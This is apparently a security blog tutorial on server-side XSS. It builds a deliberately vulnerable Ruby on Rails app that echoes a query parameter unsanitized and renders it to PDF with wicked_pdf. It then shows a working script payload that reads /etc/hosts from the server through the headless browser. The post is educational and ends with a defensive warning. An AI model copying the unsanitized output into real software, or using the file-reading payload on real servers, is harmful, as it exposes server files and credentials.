---
layout: post
title:  "Server side XSS"
date:   2020-03-07 21:08:32 -0300
categories: security
---
XSS stands for `Cross Site Scripting`, it's basically when input is not properly sanitized somewhere and a malicious actor can inject unintended javascript somewhere. That javascript will be executed by some unsuspecting user's browser and then bad stuff can happen.

There are two main types of XSS exploits, `reflected` and `persisted`. `Persisted` ones are when the malicious script is saved into a database somewhere and the malicious payload is injected every time the page is open. A practical example would be a discussion forum where the post text is not sanitized, if someone injects javascript by using the text from a post everytime someone opened that thread the payload would execute in the browser of whoever opened it.

The `reflected` kind occurs when the application received data from the HTTP request and immediately sends that data in the response in an unsafe way. This type of XSS is usually exploited by creating a phishing link that will send the user to the actual legit site but with the malicious payload encoded in the link.

People tend to underestimate the impact of reflected XSS exploits. But what if I told you that in some instances it's possible to expose sensitive data from the server by using a reflected XSS exploit? Let's create a vulnerable application using Ruby on Rails and let's attack it!

```
rails new xss-serverside
```

This will create a new rails app. Now we need a controller that will accept a query string parameter and output it into the response HTML without sanitizing it.

Let's create a new controller:

```
rails generate controller name
```

Now let's edit the newly created NameController to accept a parameter from the query string:

```ruby
class NameController < ApplicationController
  def show
    @name = params[:name]
  end
end
```

Let's create a view that will output that parameter unsafely allowing for an reflective XSS, we can do this by creating the `views/name/show.erb` file and output the variable using the raw method which will output it without any sanitization:

```
<h1>Hello!</h1>
<p><%= raw @name %></p>
```

We also need to create a route that will call the show method for the NameController, we do this by adding the following line to our `routes.rb` file:

```
get 'name', action: :show, controller: 'name'
```

If we run the application now and access the newly created route we can pass anything in the `name` query string parameter and see it reflected in the html:

![XSS1](/assets/server-side-xss/print1.png)

If we pass javascript such as `<script>alert('Hello XSS!');</script>` (If you're actually following this guide from home don't forget that you need to url encode the script before passing it in the name parameter) we'll get a nice alert showing us that we can inject javascript in the page and get it executed:

![XSS2](/assets/server-side-xss/print2.png)

Some web apps have features where they will generate PDFs or pictures out of some of their pages. This is usually done for reports or things like that. Usually that works by inputting the generated html to some sort of headless browser which will then output the PDF that is downloaded by the final user. As the headless browser in this scenario usually runs in the server the javascript will run on the server, and that could have catastrophic results.

Let's add that to our vulnerable app so I can demonstrate, first let's add the following gem to our Gemfile:

```
gem 'wicked_pdf'
```

This gem works by using `wkhtmltopdf` to generate the pdf. This tool basically runs a headless webkit and outputs the pdf based on the input html.

We need to run the following generator to create the gem initializer:

```
rails generate wicked_pdf
```

Now we need to change our controller to use the gem:

```ruby
class NameController < ApplicationController
  def show
    @name = params[:name]

    respond_to do |format|
      format.html
      format.pdf do
        render pdf: "name"
      end
    end
  end
end
```

Now if we append .pdf to our url before the query string the result will be a PDF generated from the view's html:

![XSS3](/assets/server-side-xss/print3.png)

This is where the fun begins, now if we use our XSS to inject javascript to the html and request it to be converted to PDF that javascript will be executed server-side, let's try fetching a file from the filesystem by injecting the following javascript:

```javascript
<script>
x=new XMLHttpRequest;
x.onload=function(){
document.write(this.responseText)
};
x.open("GET","file:///etc/hosts");
x.send();
</script>
```

If we open it by requesting the PDF output we'll get a PDF with the contents of the file:

![XSS4](/assets/server-side-xss/print4.png)

This can be used by an attacker to get logs, code, maybe credentials and other juicy stuff. This could probably be used for `server side request forgeries` as well.

That's why you should never underestimate any sort of XSS vulnerabilities in your system.  If your application does any sort of rendering server side by using a headless browser you're way more vulnerable than you think.
